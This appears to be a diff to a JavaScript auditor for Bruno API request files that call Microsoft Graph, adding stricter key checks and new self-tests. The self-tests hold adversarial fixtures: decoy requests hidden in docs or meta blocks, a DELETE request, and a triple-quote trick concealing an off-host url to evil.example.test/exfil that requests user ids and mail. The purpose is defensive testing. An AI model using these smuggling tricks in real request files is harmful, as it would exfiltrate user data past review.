@@ -206,6 +206,8 @@ export function canonicalFindings(blocks) {
     if (bl.name === "docs") {
       for (const l of bl.lines ?? []) if (l.trim() !== "" && (!/^ {2}/.test(l) || !bare.test(l))) out.push(`docs line ${JSON.stringify(l.slice(0, 40))} is not indented prose free of braces, backticks and double quotes`);
     } else if (bl.name === "meta") {
+      const mk = bl.entries.map(([k]) => k).sort().join();
+      if (mk !== "name,seq,type") out.push(`meta keys [${mk}] — exactly name, type and seq, each once, are required (Bruno 4.0.0 skips a request file whose meta block has no entries as invalid)`);
       for (const [k, v] of bl.entries) {
         if (!["name", "type", "seq"].includes(k)) out.push(`meta key \`${k}\` is not one of name, type, seq`);
         else if (!bare.test(v) || v.includes("'" + "'")) out.push(`meta ${k} value has braces, backticks or quotes`);
@@ -280,7 +282,7 @@ export function collectionRequests(filesByName) {
     const mb = methodBlocks[0];
     const method = mb.name.toUpperCase();
     const keys = mb.entries.map(([k]) => k);
-    if (new Set(keys).size !== keys.length || keys.some((k) => !["url", "body", "auth"].includes(k))) { fatal.push(`${name}: method block keys [${keys.join(", ")}] — only one each of url, body, auth are allowed`); continue; }
+    if (keys.slice().sort().join() !== "auth,body,url") { fatal.push(`${name}: method block keys [${keys.join(", ")}] — exactly one each of url, body and auth is required`); continue; }
     const url = (mb.entries.find(([k]) => k === "url") ?? [])[1];
     if (typeof url !== "string" || url === "") { fatal.push(`${name}: the method block has no url`); continue; }
     if (/\s/.test(url)) { fatal.push(`${name}: url \`${url}\` has whitespace inside — Bruno sends the whole line, so the gate would see a narrower request than is sent`); continue; }
@@ -452,7 +454,7 @@ function selfTest() {
     "const d = `${this.baseUrl}/identityProtection/riskyUsers?$select=id,riskLevel,riskState`;",
   ].join("\n");
   const P = { probe: "/deviceManagement/managedDevices?$top=1", users: "/users?$select=id,userPrincipalName,accountEnabled", dev: "/deviceManagement/managedDevices", risky: "/identityProtection/riskyUsers?$select=id,riskLevel,riskState" };
-  const bru = (path, method = "get", base = "{{baseUrl}}") => `meta {\n  name: x\n}\n\n${method} {\n  url: ${base}${path}\n  body: none\n  auth: inherit\n}\n\ndocs {\n  x\n}\n`;
+  const bru = (path, method = "get", base = "{{baseUrl}}") => `meta {\n  name: x\n  type: http\n  seq: 1\n}\n\n${method} {\n  url: ${base}${path}\n  body: none\n  auth: inherit\n}\n\ndocs {\n  x\n}\n`;
   const baseBru = () => ({ "a.bru": bru(P.probe), "b.bru": bru(P.users), "c.bru": bru(P.dev), "d.bru": bru(P.risky), "collection.bru": "auth {\n  mode: bearer\n}\n\nauth:bearer {\n  token: {{graphToken}}\n}\n" });
   const permObj = () => ({
     application: [
@@ -525,7 +527,7 @@ function selfTest() {
   checks.push(["ROUND1: a delegated duplicate of an application scope is FATAL", has(audit(csrc, baseBru(), pj(o)), "delegated[0]", "application token")]);
   checks.push(["ROUND1: Sandbox.bru pointing at /beta is FATAL", has(audit(csrc, baseBru(), pj(permObj()), ENV.replace("v1.0", "beta")), "Sandbox.bru", "beta")]);
   checks.push(["ROUND1: a missing Sandbox baseUrl is FATAL", has(audit(csrc, baseBru(), pj(permObj()), "vars {\n}\n"), "Sandbox.bru", "missing")]);
-  b = baseBru(); b["e.bru"] = "meta {\n  name: x\n}\n\ndocs {\n  nothing\n}\n";
+  b = baseBru(); b["e.bru"] = "meta {\n  name: x\n  type: http\n  seq: 1\n}\n\ndocs {\n  nothing\n}\n";
   checks.push(["ROUND1: an unparseable request file is FATAL, not skipped", has(audit(csrc, b), "e.bru", "method block")]);
   b = baseBru(); b["extra/groups.bru"] = bru("/groups");
   checks.push(["ROUND1: a request file in a subdirectory is FATAL", has(audit(csrc, b), "extra/groups.bru", "subdirectory")]);
@@ -546,13 +548,13 @@ function selfTest() {
     ["a second GET block with a widened $select", (t) => t + blk("get", "{{baseUrl}}" + wide), "method block"],
     ["a PATCH block after the GET", (t) => t + blk("patch", "{{baseUrl}}/users/x"), "method block"],
     ["a decoy GET inside the meta name above a widened real block", (t) => t.replace("name: x", "name: get { url: {{baseUrl}}" + P.users + " }").replace(P.users, wide), "braces, backticks"],
-    ["a multi-line decoy GET inside docs above a DELETE-only request", (t) => `meta {\n  name: x\n}\n\ndelete {\n  url: {{baseUrl}}/users/0\n}\n\ndocs {\n  get {\n    url: {{baseUrl}}${P.users}\n  }\n}\n`, "not indented prose"],
+    ["a multi-line decoy GET inside docs above a DELETE-only request", (t) => `meta {\n  name: x\n  type: http\n  seq: 1\n}\n\ndelete {\n  url: {{baseUrl}}/users/0\n}\n\ndocs {\n  get {\n    url: {{baseUrl}}${P.users}\n  }\n}\n`, "not indented prose"],
     ["text outside any block", (t) => t + "\nstray line\n", "outside any block"],
     ["a duplicate url key in the method block", (t) => t.replace("body: none", "url: {{baseUrl}}" + wide + "\n  body: none"), "method block keys"],
   ]) { b = baseBru(); b["b.bru"] = edit(b["b.bru"]); checks.push([`ROUND3: ${label} is FATAL`, has(audit(csrc, b), "b.bru", needle)]); }
   // ---- review round 5: Bruno's triple-quote multiline value ----
   const TQ = "'" + "'" + "'";
-  b = baseBru(); b["b.bru"] = `meta {\n  name: x\n}\n\nget {\n  url: {{baseUrl}}${P.users}\n  body: ${TQ}\n}\ndocs {\n${TQ}\n  url: https://evil.example.test/exfil?$select=id,mail\n  auth: inherit\n}\n`;
+  b = baseBru(); b["b.bru"] = `meta {\n  name: x\n  type: http\n  seq: 1\n}\n\nget {\n  url: {{baseUrl}}${P.users}\n  body: ${TQ}\n}\ndocs {\n${TQ}\n  url: https://evil.example.test/exfil?$select=id,mail\n  auth: inherit\n}\n`;
   checks.push(["ROUND5: a triple-quote value that swallows the closing brace and a later off-host url line is FATAL", has(audit(csrc, b), "b.bru", "multiline")]);
   b = baseBru(); b["b.bru"] = b["b.bru"].replace("x\n}", `x ${TQ}\n}`);
   checks.push(["ROUND5: a triple-quote anywhere in a request file is FATAL (docs included)", has(audit(csrc, b), "b.bru", "multiline")]);
@@ -587,7 +589,7 @@ function selfTest() {
     b = baseBru(); delete b["b.bru"]; b[where] = bru(P.users);
     checks.push([`ROUND7: ${where} (hidden or nested for Bruno, counted by a naive walk) is FATAL`, has(audit(csrc, b), where, "subdirectory")]);
   }
-  b = baseBru(); b["folder.bru"] = "meta {\n  name: x\n}\n";
+  b = baseBru(); b["folder.bru"] = "meta {\n  name: x\n  type: http\n  seq: 1\n}\n";
   checks.push(["ROUND7: a root folder.bru is FATAL", has(audit(csrc, b), "folder.bru", "folder-level")]);
   // ---- review round 8: file names Bruno skips ----
   for (const bad of [".bru", "-x.bru", "x y.bru", "x.BRU", "x..bru", "x_.bru"]) {
@@ -603,6 +605,19 @@ function selfTest() {
     ["no docs block at all", (t) => t.replace("\ndocs {\n  x\n}\n", "\n")],
     ["two docs blocks", (t) => t + "\ndocs {\n  y\n}\n"],
   ]) { b = baseBru(); b["b.bru"] = edit(b["b.bru"]); checks.push([`ROUND9: ${label} is FATAL`, has(audit(csrc, b), "b.bru", "docs")]); }
+  // ---- review round 10: a meta block with no entries is skipped by Bruno ----
+  for (const [label, metaText] of [
+    ["a meta block holding one empty line", "meta {\n\n}"],
+    ["a meta block holding a whitespace line", "meta {\n  \n}"],
+    ["a meta block holding two empty lines", "meta {\n\n\n}"],
+    ["an empty meta block", "meta {\n}"],
+    ["a meta block with only a name", "meta {\n  name: x\n}"],
+    ["a meta block with a repeated key", "meta {\n  name: x\n  name: y\n  type: http\n  seq: 1\n}"],
+  ]) { b = baseBru(); b["b.bru"] = b["b.bru"].replace(/meta \{[\s\S]*?\n\}/, metaText); checks.push([`ROUND10: ${label} is FATAL`, has(audit(csrc, b), "b.bru", "meta")]); }
+  b = baseBru(); b["b.bru"] = b["b.bru"].replace("  body: none\n", "");
+  checks.push(["ROUND10: a method block missing body is FATAL (exactly url, body, auth)", has(audit(csrc, b), "b.bru", "method block keys")]);
+  b = baseBru(); b["b.bru"] = b["b.bru"].replace("  auth: inherit\n", "");
+  checks.push(["ROUND10: a method block missing auth is FATAL", has(audit(csrc, b), "b.bru", "method block keys")]);
   // ---- review round 4: Bruno ends a block (docs included) at any newline + `}` whatever follows it ----
   for (const [label, edit, needle] of [
     ["`}post {` at column 0 closing docs and opening a second http block", (t) => t.replace(/\}\s*$/, "}post {\n  url: {{baseUrl}}/users\n}\n"), "text after a closing brace"],
